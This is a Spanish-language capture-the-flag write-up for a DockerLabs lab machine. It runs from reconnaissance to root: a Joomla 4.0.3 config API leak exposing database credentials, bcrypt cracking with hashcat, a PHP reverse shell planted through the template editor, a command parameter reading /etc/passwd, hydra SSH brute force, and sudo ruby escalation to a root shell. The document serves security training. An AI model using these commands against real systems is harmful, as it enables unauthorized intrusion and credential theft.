@@ -1,0 +1,150 @@
+nmap: 22,80 3306
+
+![[dockerlabs/dificil/vulnerame/nmap.png]]
+
+---
+
+en la pagina principal hay un apache2 ubuntu, nada interesante tampoco en el código fuente
+
+hacemos un gobuster:
+
+       - # gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 20 -x php,html,txt -k
+
+y nos da:
+
+![[dockerlabs/dificil/vulnerame/gobuster.png]]
+
+entramos y tenemos pagina
+
+![[wordpress.png]]
+
+en la pagina encontré esto interesante
+
+![[joomla.png]]
+
+*buscar posible explotación:  Joomla 4.0.3*
+
+> exploit encontrado: https://vulncheck.com/blog/joomla-for-rce
+
+![[ve.png]]
+
+utilizamos joomscan (JoomScan es una herramienta de escaneo de vulnerabilidades diseñada específicamente para aplicaciones web basadas en Joomla. Sirve para identificar posibles vulnerabilidades y debilidades en sitios web que utilizan este popular sistema de gestión de contenido (CMS):
+
+       - joomscan -u http://172.17.0.2/wordpress/
+
+nos da:
+
+![[joomscan.png]]
+
+entramos a los dos de robots.txt y administrador
+
+![[robots.png]]
+
+![[dockerlabs/dificil/vulnerame/admin.png]]
+
+buscando también me llamo la atención esto
+
+![[joomla version.png]]
+
+hasta que encontré este comando
+
+     curl -v http://172.17.0.2/wordpress/api/index.php/v1/config/application?public=true
+
+y me dio las credenciales
+
+![[usuarios.png]]
+
+
+usuario: joomla_user
+contraseña: vuln
+
+probé en el login que teníamos en administrator, pero no funciono así que probé con la base de datos  
+
+
+revisamos una posible base de datos con los usuarios encontrados:
+
+      - mysql -h 172.17.0.2 -u joomla_user -pvuln
+
+entramos a "mysql none":
+
+     show databases; 
+
+![[database.png]]
+
+    use joomla_db
+    show tables
+
+![[show1.png]]
+
+
+    select * from ffsnq_users;
+
+nos da una contraseña encriptada:
+
+![[pass1.png]]
+
+
+utilizamos: https://hashes.com/en/decrypt/hash
+
+       - $2y$10$UVmUci/wKgu7LFir7KIzP.NDup3lYDUxPzz7WZryvEYVdUjUVhou.
+       - contraseña: bcrypt
+
+creamos un archivo con la contraseña encriptada llamado "hash.txt"
+
+en el terminal:
+      
+    hashcat -m 3200 hast.txt /usr/share/wordlists/rockyou.txt
+    
+nos da otra contraseña: 14344392
+también nos da posible contraseña: tequieromucho
+
+credenciales para admin:
+
+      - firstatack
+      - tequieromucho
+
+vamos al login e ingresamos
+
+![[dockerlabs/dificil/vulnerame/panel1.png]]
+
+luego buscando en la pagina como admin vamos a:
+
+> system > site templates > click en la pagina > index.php y cargamos un código php 
+
+para conectarnos: https://github.com/pentestmonkey/php-reverse-shell
+cambiamos IP y puerto: lo guardamos y en otra pestaña abrimos con la IP de la pagina mientras tenemos en escucha nuestro puerto 443, y entramos.
+![[dockerlabs/dificil/vulnerame/conexion.png]]
+
+luego de cargar en index.php la reverse la cargamos en el URL con el terminal en escucha
+
+> http://172.17.0.2/wordpress/index.php?cmd=cat%20/etc/passwd
+
+hacemos tratamiento de stty y buscamos como escalar.
+
+dentro hay dos usuarios: guadalupe e ignacio y hacemos un ataque de fuerza bruta:
+
+     hydra -l ignacio -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
+
+     hydra -l guadalupe -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
+
+![[dockerlabs/dificil/vulnerame/hydra.png]]
+
+y tenemos la contraseña de ambos usuarios. con el que podemos escalar es con ignacio
+
+![[dockerlabs/dificil/vulnerame/sudo -l.png]]
+
+ya dentro del usuario Ignacio podemos ejecutar los "nano" así que modificamos el archivo "saludos.rb": 
+
+
+      sudo /usr/bin/saludos.rb
+
+         - exec "/bin/sh"
+         - system "/bin/sh"
+
+ejecutamos 
+
+     sudo /usr/bin/ruby /usr/bin/saludos.rb
+
+![[dockerlabs/dificil/vulnerame/root.png]]
+
+y somos root! 
